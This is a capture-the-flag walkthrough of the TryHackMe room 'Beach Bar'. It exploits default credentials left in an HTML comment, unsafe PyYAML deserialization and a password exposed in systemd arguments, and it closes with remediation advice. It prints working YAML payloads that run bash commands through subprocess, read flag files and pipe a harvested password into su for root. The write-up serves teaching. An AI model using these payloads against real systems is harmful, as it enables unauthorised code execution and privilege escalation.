# Walkthrough: TryHackMe Room: "Beach Bar"

## Executive Summary
**Room Name:** Beach Bar  
**Difficulty:** Easy  
**Category:** Boot2Root / Web Exploitation  
**Objective:** Compromise the beach bar jukebox system, retrieve the user flag, and escalate privileges to root.  
**Key Vulnerabilities:**  
1. **Information Disclosure** (HTML Comments)  
2. **Unsafe YAML Deserialization** (Python PyYAML)  
3. **Credential Reuse/Hardcoding** (Systemd Service Arguments)  

---

## Phase 1: Reconnaissance & Initial Access

### 1.1 Service Enumeration
An initial Nmap scan reveals a single open port:
- **Port 80/TCP:** HTTP Web Server (Flask/Jinja2 application)

Visiting `http://10.49.135.34` (your's will be different) redirects to a login page (`/login`).

### 1.2 Credential Discovery
Inspecting the source code of the login page (`Ctrl+U`) reveals a developer comment left in the HTML:
```html
<!--
    staff note: the demo DJ login is still enabled for the soft opening.
    dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```
- **Username:** `dj`
- **Password:** `dj`

Logging in with these credentials grants access to the **Dashboard**, which features playlist management (Import/Export).

---

## Phase 2: Exploitation (User Flag)

### 2.1 Vulnerability Identification
The application allows users to **Import** playlists in YAML format. The briefing hint ("wired straight into the floor with trimmings attached") and the "Easy" difficulty suggest a misconfiguration in how YAML files are parsed.

Testing with a standard payload confirms the application is using `yaml.load()` (unsafe) instead of `yaml.safe_load()`, enabling **Arbitrary Code Execution** via Python object instantiation.

### 2.2 Exploit Development
We craft a malicious YAML file to execute system commands. The `subprocess.check_output` function is used to capture command output directly into the playlist name field.

**Payload Structure:**
```yaml
playlist:
  name: !!python/object/apply:subprocess.check_output [["bash", "-c", "<COMMAND>"]]
  vibe: test
  tracks: []
```

### 2.3 Retrieving the User Flag
1.  **Enumerate Users:** First, we list the contents of `/home` to identify valid usernames.
    ```yaml
    playlist:
      name: !!python/object/apply:subprocess.check_output [["ls", "/home"]]
      vibe: test
      tracks: []
    ```
    **Output:** `bartender`, `ubuntu`.

2.  **Read the Flag:** We target the `bartender` user directory.
    ```yaml
    playlist:
      name: !!python/object/apply:subprocess.check_output [["bash", "-c", "cat /home/bartender/user.txt"]]
      vibe: test
      tracks: []
    ```
    **Result:** The dashboard displays the user flag:  
    **`THM{y4ml_pl4yl1st_pwns_th3_b34ch}`**

---

## Phase 3: Privilege Escalation (Root Flag)

### 3.1 Service Enumeration
With code execution confirmed, we investigate system services to find a path to root. We inspect `systemd` units, specifically looking for custom services related to the "jukebox".

**Command Executed:**
```bash
systemctl status jukeboxd.service --no-pager --full
```

**Output Analysis:**
```text
● jukeboxd.service - Beach Bar jukebox streaming daemon
     Loaded: loaded (/etc/systemd/system/jukeboxd.service; enabled)
     Active: active (running)
   Main PID: 609 (python)
     Command: /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass "SunsetSpritz2024!" --bitrate 320k
```

### 3.2 Credential Harvesting
The service configuration exposes a critical security flaw: **Hardcoded Credentials in Process Arguments**.
- The `--stream-pass` argument reveals the password: **`SunsetSpritz2024!`**
- This password is likely reused for the `bartender` user's sudo privileges or for the root account.

### 3.3 Escalation to Root
We attempt to use the discovered password to escalate privileges. Using the `su` command (switch user) with the harvested password allows us to execute commands as root.

**Final Payload:**
```yaml
playlist:
  name: !!python/object/apply:subprocess.check_output [["bash", "-c", "echo 'SunsetSpritz2024!' | su - root -c 'cat /root/root.txt'"]]
  vibe: test
  tracks: []
```

**Result:** The dashboard displays the root flag:  
**`THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}`**

---

## Remediation & Lessons Learned

1.  **Safe YAML Parsing:** Always use `yaml.safe_load()` instead of `yaml.load()` to prevent arbitrary object instantiation and code execution.
2.  **Secret Management:** Never hardcode passwords or secrets in systemd service files, scripts, or command-line arguments. Use environment variables, dedicated secret management tools (e.g., HashiCorp Vault), or systemd's `LoadCredential` feature.
3.  **Code Hygiene:** Remove all developer comments, debug endpoints, and default credentials from production builds before deployment.
4.  **Process Argument Privacy:** Be aware that process arguments (`/proc/[pid]/cmdline`) are visible to other users on the system. Sensitive data passed via CLI flags is easily discoverable.

---


